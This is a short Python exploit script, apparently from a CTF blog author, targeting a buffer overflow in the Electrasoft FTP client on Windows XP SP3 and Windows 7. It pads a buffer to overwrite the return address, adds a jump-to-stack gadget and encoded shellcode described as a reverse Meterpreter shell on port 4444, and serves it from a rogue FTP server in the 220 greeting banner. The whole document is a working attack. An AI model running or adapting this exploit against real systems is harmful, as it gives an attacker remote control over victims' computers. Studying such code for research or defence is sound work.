#!/usr/bin/python
# 
# Electrasoft FTP Client exploit
# Author: Kris Hunt - https://ctf.rip
#
# Targets: 
# 1 - Windows XP SP3
# 2 - Windows 7 SP1 x86
from pwn import *
import sys

if len(sys.argv) < 2: 
	print "Usage: %s <target>" % sys.argv[0]
	print "Targets: 1 = XP SP3, 2 = Win7 SP1 x86"
	quit()

buf = "A" * 989			# our eip begins @ 989 bytes 

if sys.argv[1] == '1':
	buf += p32(0x7c919db0)	# push esp; ret in ntdll.dll xpsp3
else:
	buf += p32(0x7775e871)	# jmp esp in ntdll.dll win7

# shellcode, reverse meterpreter, port 4444
buf += "\x4a\x91\x2f\x49\x4a\x98\x48\x43\xdd\xc1\xba\x0c\x13"
buf += "\x64\xd7\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x54\x31\x53"
buf += "\x18\x83\xc3\x04\x03\x53\x18\xf1\x91\x2b\xc8\x77\x59"
buf += "\xd4\x08\x18\xd3\x31\x39\x18\x87\x32\x69\xa8\xc3\x17"
buf += "\x85\x43\x81\x83\x1e\x21\x0e\xa3\x97\x8c\x68\x8a\x28"
buf += "\xbc\x49\x8d\xaa\xbf\x9d\x6d\x93\x0f\xd0\x6c\xd4\x72"
buf += "\x19\x3c\x8d\xf9\x8c\xd1\xba\xb4\x0c\x59\xf0\x59\x15"
buf += "\xbe\x40\x5b\x34\x11\xdb\x02\x96\x93\x08\x3f\x9f\x8b"
buf += "\x4d\x7a\x69\x27\xa5\xf0\x68\xe1\xf4\xf9\xc7\xcc\x39"
buf += "\x08\x19\x08\xfd\xf3\x6c\x60\xfe\x8e\x76\xb7\x7d\x55"
buf += "\xf2\x2c\x25\x1e\xa4\x88\xd4\xf3\x33\x5a\xda\xb8\x30"
buf += "\x04\xfe\x3f\x94\x3e\xfa\xb4\x1b\x91\x8b\x8f\x3f\x35"
buf += "\xd0\x54\x21\x6c\xbc\x3b\x5e\x6e\x1f\xe3\xfa\xe4\x8d"
buf += "\xf0\x76\xa7\xd9\x35\xbb\x58\x19\x52\xcc\x2b\x2b\xfd"
buf += "\x66\xa4\x07\x76\xa1\x33\x68\xad\x15\xab\x97\x4e\x66"
buf += "\xe5\x53\x1a\x36\x9d\x72\x23\xdd\x5d\x7b\xf6\x48\x5b"
buf += "\xeb\x39\x24\xad\x6f\xd1\x37\x32\x7e\x7e\xb1\xd4\xd0"
buf += "\x2e\x91\x48\x90\x9e\x51\x39\x78\xf5\x5d\x66\x98\xf6"
buf += "\xb7\x0f\x32\x19\x6e\x67\xaa\x80\x2b\xf3\x4b\x4c\xe6"
buf += "\x79\x4b\xc6\x03\x7d\x05\x2f\x61\x6d\x71\x4e\x89\x6d"
buf += "\x81\xfb\x89\x07\x85\xad\xde\xbf\x87\x88\x29\x60\x78"
buf += "\xff\x29\x67\x86\x7e\x18\x13\xb0\x14\x24\x4b\xbc\xf8"
buf += "\xa4\x8b\xea\x92\xa4\xe3\x4a\xc7\xf6\x16\x95\xd2\x6a"
buf += "\x8b\x03\xdd\xda\x7f\x84\xb5\xe0\xa6\xe2\x19\x1a\x8d"
buf += "\x71\x5d\xe4\x53\x57\xc6\x8d\xab\xd7\xf6\x4d\xc6\xd7"
buf += "\xa6\x25\x1d\xf8\x49\x86\xde\xd3\x01\x8e\x55\xb5\xe0"
buf += "\x2f\x69\x9c\xa5\xf1\x6a\x12\x7e\xe7\xe4\xd5\x81\x08"
buf += "\x07\xea\x57\x31\x7d\x2b\x64\x06\x8e\x06\xc9\x2f\x05"
buf += "\x68\x5d\x2f\x0c"
buf += "A" * (2000 - len(buf))	# pad to 2000 bytes

l = listen(21)
conn = l.wait_for_connection()
conn.sendline('220 ' + buf + '\r\n')
conn.recv()

